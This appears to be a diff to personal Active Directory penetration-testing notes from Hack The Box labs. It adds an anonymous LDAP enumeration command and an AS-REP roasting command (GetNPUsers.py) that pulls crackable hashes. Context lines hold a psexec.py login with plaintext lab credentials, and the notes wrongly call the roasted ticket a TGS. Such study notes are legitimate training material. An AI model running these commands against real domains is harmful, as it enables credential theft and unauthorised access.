@@ -195,6 +195,16 @@ Now go in the node info taband navigate in the **OUTBOUND CONTROL RIGHTS**
  ![](https://remnote-user-data.s3.amazonaws.com/az6LnOj1awc9VvODUoG12o0Hl0993sh8fH-rUxfz2KjAJfoPAfkzeWWVNeQb39FM-9Rb-W_hD8cYNH6p9jq8hDP4m1u0qMIr_5wHUXBbTcOuvVHKbZBzsrKSN_BSfWYz.png)
 
 
+## LDAP - Enums
+### LDAP - Anonymous authentication
+Check if the LDAP service allow anonymous authentication
+```bash
+ldapsearch -H LDAP://10.129.211.144 -x -s base namingcontexts
+```
+The `namingcontexts` attribute lists the **base Distinguished Name (DNs)** of all **naming contexts** that the LDAP server knows about.
+
+Think of naming context as **entry point or "root containers"** in the LDAP directory tree where different categories of data are stored. Each one represents different **subtree** of the directory
+
 # ACL Abuse
 
 ## Create cred object
@@ -1350,6 +1360,13 @@ Connect to the target domain using **psexec.py**
 psexec.py FREIGHTLOGISTICS.LOCAL/sapsso:pabloPICASSO@ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
 ```
 
+
+## Do not require Kerberos preauthentication 
+I a object in AD have this flag means we can utilize the [GetNPUsers.py](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py) script to ask **TGS** ticket for users that have **Do not require Kerberos preauthentication** set.
+
+```bash
+GetNPUsers.py htb.local/svc-alfresco -dc-ip 10.129.211.144 -no-pass -format hashcat
+```
 # Hashcat
 
 ### NTLMv2
